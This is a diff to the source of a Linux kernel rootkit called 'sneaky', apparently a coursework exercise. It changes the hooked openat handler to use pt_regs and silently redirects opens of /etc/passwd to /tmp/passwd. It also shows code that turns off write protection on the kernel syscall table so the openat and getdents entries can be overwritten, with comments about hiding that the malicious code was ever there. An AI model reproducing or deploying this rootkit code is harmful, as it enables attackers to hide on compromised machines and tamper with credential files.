@@ -49,22 +49,25 @@ int disable_page_rw(void *ptr){
  * 
  **********************************************************************************************/
 /* -------------------- openat -------------------- */
+/**
+ * @brief functor to original openat
+ * 
+ */
+asmlinkage int (*original_openat)(struct pt_regs *);
 
-// asmlinkage int (*original_openat)(struct pt_regs *);
-asmlinkage int (*original_openat)(const char *pathname, int flags);
-
-// Define your new sneaky version of the 'openat' syscall
-// asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
-// {
-//   return (*original_openat)(regs);
-// }
-
-asmlinkage int sneaky_sys_openat(const char *pathname, int flags) {
-  if(strcmp(pathname, "/etc/passwd") == 0){
+/**
+ * @brief sneaky openat
+ * 
+ * @param regs 
+ * @return asmlinkage 
+ */
+asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
+{
+  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
     const char* tmpPasswdPath = "/tmp/passwd";
-    copy_to_user((void*)pathname, tmpPasswdPath, strlen(tmpPasswdPath));
+    copy_to_user((char*)(regs->si), tmpPasswdPath, strlen(tmpPasswdPath));
   }
-  return original_openat(pathname, flags);
+  return (*original_openat)(regs);
 }
 
 /* -------------------- getdents -------------------- */
@@ -153,14 +156,14 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void*)sys_call_table[__NR_openat];
   original_getdents64 = (void*)sys_call_table[__NR_getdents];
-  original_read = (void*)sys_call_table[__NR_read];
+  // original_read = (void*)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -180,7 +183,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents] = (unsigned long)original_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)original_read;
+  // sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
